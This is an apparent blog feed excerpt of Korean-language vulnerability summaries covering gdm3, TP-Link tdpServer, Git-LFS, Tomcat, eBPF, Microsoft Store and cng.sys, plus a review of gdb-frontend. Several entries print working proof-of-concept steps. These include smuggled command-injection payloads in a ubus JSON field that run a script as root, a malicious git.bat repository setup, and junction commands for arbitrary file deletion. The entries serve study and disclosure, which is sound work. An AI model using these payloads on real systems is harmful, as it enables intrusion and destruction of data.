    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version ≤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version ≤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3에서 시스템 권한의 계정을 만들어 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>gdm3(gnome display manager)은 그래픽 인터페이스로 로그인 및 사용자 인증을 처리하는데, 새로 설치된 시스템 등의 이유로 사용자 계정을 찾을 수 없을 때 <code>gnome-initial-setup</code> 을 호출하고 sudo 그룹의 새로운 계정을 만들 수 있습니다.</p><p>gdm3에서는 기존 계정을 찾기 위해 D-Bus 메소드 호출을 사용해 <code>accountsservice</code> 데몬의 <code>look_for_existing_users_sync</code> 에서 기존 사용자 목록을 가져옵니다. 이때 서비스 거부 공격으로 <code>accountsservice</code> 데몬이 응답하지 않도록 하면 D-Bus 메소드 호출이 시간 초과로 인해 연결이 실패하고 <code>priv→have_existing_user_accounts</code> 의 기본값인 false가 유지됩니다.</p><p>이후<code>wants_initial_setup</code> 에서 <code>priv→have_existing_user_accounts</code>가 false면 gdm3는 현재 시스템에 계정이 없는 것으로 인식하고 <code>gnome-initial-setup</code>을 호출해 시스템 권한의 계정을 생성할 수 있습니다.</p><p>해당 취약점의 패치는 <code>priv-&gt;have_existing_user_accounts</code>의 기본값을 true로 수정하는 것으로 적용되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 라우터의 LAN에 있는 공격자만 악용할 수 있지만 특별한 인증이 필요하지 않은 취약점입니다.</p><p>CVE-200-10882에서 <code>system(systemCmd)</code>에 의해 Command Injection 취약점이 존재하였습니다. 해당 취약점은 <code>system()</code> 사용 대신 lua 스크립트를 이용하여 <code>lua_onemesh_call(slave_mac)</code>을 통해 명령어를 실행함으로써 패치되었습니다. <code>lua_onemesh_call()</code>은 <code>luci.controller.admin.onemesh</code> lua 스크립트를 사용하며 인수를 전달하고 요청된 함수의 핸들러를 실행하는  <code>dispatch</code>라는 이름의 특별한 함수를 사용합니다. 이때 <code>sync_wifi_specified(slave_mac)</code>이 실행됩니다. <code>sync_wifi_specified()</code>는 매개 변수를 <code>target_id</code>로 <code>printf</code>를 사용하여 구성되며 json 내용으로 실제 명령이 실행됩니다. json을 escape 하면 root로 실행되는 lua script process에서 명령 실행이 가능합니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_mac의 경우 <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>로 복사되며 <code>memset(slave_mac, 0, 0x424)</code>로 memset 됩니다. 또한 바이트 정렬로 인하여 slave_mac 변수는 0x12만큼 할당되며 17자까지 문자를 삽입할 수 있습니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>command injection</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 이상 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application은 dynamic loading을 통해 run-time 도중 어느 시점에라도 코드를 메모리에 로드할 수 있습니다. API level 29부턴 이 dynamic loading을 악용해 apk의 정적 검사를 피해 가는 악성코드들을 막기 위해 apk에 속하지 않은 코드의 load를 막고 있습니다. 하지만 여전히 DexClassLoader에 의한 .dex 파일의 dynamic loading이 가능해 여전히 악용에 사용될 수 있습니다.</p><p>모든 프로세스는 각각 <code>/proc/[PID]</code>라는 디렉터리를 갖고, 그중 <code>/proc/[PID]/maps</code>라는 파일은 프로세스의 매핑된 메모리가 기록돼있습니다.  따라서 프로세스가 어떠한 파일에 접근하면 <code>/proc/[PID]/maps</code>에 기록이 남습니다. 이 기록을 통해 프로세스가 <code>/data/data</code> 디렉터리 속 .dex 접근 여부를 검사해 dynamic loading을 탐지할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend 포너블에 적합한가?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5개월-묵힌-링크"><a href="#5개월-묵힌-링크" class="headerlink" title="5개월 묵힌 링크"></a>5개월 묵힌 링크</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>몇 달 전 Fandu형님이 직접 사용해보고 후기를 알려달라는 말과 함께 링크를 하나 던져주셨습니다. 할 일도 묵혀둬야 제맛! 5달 동안 고이 모셔놓은 GDBFrontend, 똥인지 된장인지 찍어 먹어 봅시다.</p><h1 id="설치-및-실행"><a href="#설치-및-실행" class="headerlink" title="설치 및 실행"></a>설치 및 실행</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>공식 github에 나와 있는 설치 방법입니다. 터미널 키시고 그대로 입력하시면 되겠습니다.</p><ol><li>GDB 8.2 이상</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend를 사용하기 위한 요구사항은 3가지가 있는데, 지금 저의 환경은 Ubuntu 20.04이므로 tmux만 추가로 설치해주면 환경 세팅은 끝입니다.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontend를 실행시킨 후 브라우저로 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>에  접속해주시면 됩니다. <code>-w</code> 옵션으로 working directory도 설정해 줄 수 있습니다.</p><h1 id="파이어-폭스는-나가있어"><a href="#파이어-폭스는-나가있어" class="headerlink" title="파이어 폭스는 나가있어"></a>파이어 폭스는 나가있어</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>만약 파이어폭스를 쓰고 계신다면 다른 브라우저를 사용하셔야 합니다. gdb-frontend server와의 연결이 계속 끊기길래 원인을 찾느라 시간 낭비를 좀 많이 했습니다. 자주 애용하는 gdb 플러그인 pwndbg와의 충돌이 문제라 생각해 pwndbg도 지워보고, 아예 VM을 새로 생성해 처음부터 다시 환경 구축해봤지만 결국 파폭과의 호환 문제였네요…</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem · Issue #5 · rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-훑어보기"><a href="#gui-훑어보기" class="headerlink" title="gui 훑어보기"></a>gui 훑어보기</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>브라우저로 접속한 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>의 화면은 gdb shell이 띄워진 terminal과 gui 부분으로 나뉩니다. terminal 부분은 gdb와 다를 게 없으니 넘어가고, gui의 기본적인 구성과 기능 중 제가 써보면서 좋다고 느낀 점들을 써보겠습니다.</p><p>[ ! ] 개발자의 관점에서 디버거를 써본 적이 단 한 번도 없으니 유의하세요.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>함수 별로 assembly 코드로 출력해주며 다음에 실행될 인스트럭션은 연한 색으로 하이라이트 됩니다. 그중에서도 Call Stack 0번에 나타나는 함수의 하이라이트 된 부분은 eip (혹은 rip)입니다. 현재 프로그램 흐름의 위치를 대단히 직관적으로 알 수 있습니다. 글재주가 없어서 이렇게밖에 설명을 못 하겠네요. ㅎㅎ</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break point는 instruction의 주소를 클릭해서 생성 혹은 삭제할 수 있습니다. 좌측에 break point들의 목록을 보여주며 체크박스로 활성화 여부를 변경할 수 있습니다. 기존에 사용하던 pwndbg에서 가장 아쉬웠던 점이 바로 break point 관리가 번거롭다는 것인데, gdb-frontend는 GUI로 이 기능을 제공하니 상대적으로 좀 더 편리합니다.</p><h1 id="쓸-가치가-있는가"><a href="#쓸-가치가-있는가" class="headerlink" title="쓸 가치가 있는가?"></a>쓸 가치가 있는가?</h1><p>확장성이 좋다는 점을 내세우고 있는 만큼 설명할게 많진 않네요.</p><p>위에서 설명한 것들을 제외하면 대부분의 기능을 gdb에 의존하고 있고, 그냥 gdb만 사용하는 것과 크게 다르다는 느낌은 받지 못했습니다. gdb를 써보신 분들은 아시겠지만 gdb만을 사용해서 디버깅하는 변태는 없습니다. 적어도 해킹 씬에는 없을 거야. 메모리나 register값의 변화에 집중하며 디버깅하는 저에게 instruction 하나 실행할 때마다 <code>info reg</code> 같은 명령어를 입력하라고 한다면… 어후…</p><p>그런 점을 gdb-frontend가 개선해주진 않습니다. UI가 이쁘긴 하지만 저에게 필요한 부분은 구현이 안돼 있으니 ‘이쁜 쓰레기’라는 단어는 이럴 때 쓰는 말 이겠죠. 정작 Disassembly는 화면에 두 번이나 출력해줍니다. ㅎㅎ</p><blockquote><p>L0ch 曰 : 이쁜 쓰레기네 이쁜 쓰레기</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontend로 CTF문제 하나 풀고, 연구 글을 가장한 write-up을 작성하려 했지만 도저히 gdb-frontend만으로 문제를 풀 순 없을 거 같네요. 그래서 일말의 희망을 갖고 pwndbg와 연동해봤습니다만, gdb-frontend는 주객전도를 허용하지 않습니다. gdb-frontend의 ui가 없어질 정도로 terminal의 크기를 키워야 하고,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>무엇보다 gdb-frontend가 뻗어버립니다. 일단 제가 사용하면서 crash 나는 상황은 2가지 있었습니다.</p><ol><li>분석하고 있는 프로세스가 segmentation fault를 일으킬 때</li><li>존재하는 프로세스에 attach 할 때</li></ol><p>저에겐 이 두 가지 상황 모두 매우 큰 단점입니다. python exploit 코드에 따라 동작하고 있는 프로세스에 gdb를 attach 해 분석하는 것이 주된 사용방법인데, 그게 안된다니요… 그리고 segmentation fault에 대한 어떠한 정보도 얻을 수 없으니 취약점 찾는 입장에선 화딱지가 안 날 수가 없습니다.</p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><ol><li>gdb의 기능을 gui로 사용할 수 있다? <strong>No</strong><ul><li>결국 모든 동작은 gdb terminal을 통해 이루어짐.</li><li>gui로 gdb를 다루는 것이 아니라, gdb의 결괏값을 gui로 보여주는 플러그인</li><li>chrome으로 gdb를 사용하는 거라 오히려 불편함</li></ul></li><li>pwnable에 사용할 수 있다? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p><p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p><p>취약점의 PoC는 아래와 같습니다.</p><ol><li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>저장소에 lfs 파일을 추가합니다.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>git</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 Apache Tomcat의 WebSocket 프레임에서 <code>payloadLength</code>에 의해 무한 루프가 트리거 되어 DoS 공격으로 연결될 수 있는 취약점입니다.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>의 WebSocket 프레임에서 payload length 필드가 127(2진수 1111111)이면 64비트 확장 payload length를 사용합니다. 이 payload length는 64비트 unsigned integer이지만 RFC에서는 최상위 비트가 항상 0이 되도록 요구합니다.</p><p>따라서 payload length 필드를 127로 설정해준 후 다음 8바이트의 MSB를 1로 설정해주기만 하면 DoS 공격을 수행할 수 있습니다.</p><p>취약점과 관련된 패치는 <code>payloadLength</code>가 음수가 될 경우 exception을 발생시키도록 패치되었습니다.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>해당 취약점에 관한 PoC Code는 <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">여기</a>서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>apache</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
      <tag>dos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 트래킹해  memory load와 store의 out-of-bound 여부를 검사하며,  32-bit와 64-bit 각각의 range를 구분해 관리합니다. OR연산이 끝난 후 그에 맞게  32-bit 레지스터의 range를 업데이트하는 <code>scalar32_min_max_or()</code>함수는 이 구분이 확실하지 못하고, 버그를 유발합니다.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range를 32-bit range로 casting 하는 <code>scalar32_min_max_or()</code>의 코드 부분입니다. Verifier는 <code>s32_min_value</code>와 <code>s32_max_value</code>를 이용해 range를 트래킹 하는데, 만약 이 두 값이 같다면 레지스터 값을 상수로 인식하고 그에 따라 코드가 분기합니다. </p><p>만약 위 코드에서 <code>dst_reg-&gt;umin_value</code>가 1이고, <code>dst_reg-&gt;umax_value</code>가 25769803777이라면 <code>dst_reg-&gt;s32_min_value</code>와 <code>dst_reg-&gt;s32_max_value</code> 둘 다 1로 저장되어 레지스터를 range가 아닌 상수로 인식하게 됩니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  <code>C:\Program Files\WindowsApps</code> 디렉터리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. </p><p>지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅 하는 디렉터리인 <code>C:\ProgramFiles\ModifiableWindowsApps</code>을 추가했는데, 이 기능에 심볼릭 링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.</p><p>PoC는 아래와 같습니다.</p><ol><li>다른 시스템 드라이브 <code>D:\</code>에 pivot 할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장 위치를 <code>D:\</code> 로 변경합니다</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Store에서 모드 지원이 되는 게임 앱을 받아 설치하면 <code>D:\Program Files\ModifiableWindowsApps</code> 하위에 해당 앱의 디렉터리가 생성됩니다.</p></li><li><p>이중 심볼릭 링크를 생성해 앱의 디렉터리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션 할 최종 디렉터리는 삭제할 시스템 권한의 디렉터리로 설정합니다.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.</li></ol><p>작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>윈도우 커널 암호화 드라이버인 cng.sys에서 권한 상승이 가능한 취약점이 발견되었습니다. 해당 취약점은 IOCTL 0x390400 처리 중 <code>cng!CfgAdtpFormatPropertyBlock</code> 함수에서 16-bit integer truncation에 의해 발생했습니다.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) &#123;*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&#x27; &#x27;</span>;SourceBuffer++;&#125;</code></pre><p><code>SourceLength</code>의 값이 <code>0x2AAB</code>보다 크거나 같으면 NonPagedPool에 비정상적으로 작은 버퍼가 할당되고 binary-to-hex 변환 루프에 의해 오버 플로우가 발생합니다. 윈도우 10 1903에서 테스트되었지만 윈도우 7부터 취약점이 존재하는 것으로 예상되며 현재 취약점이 악용되고 있다고 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
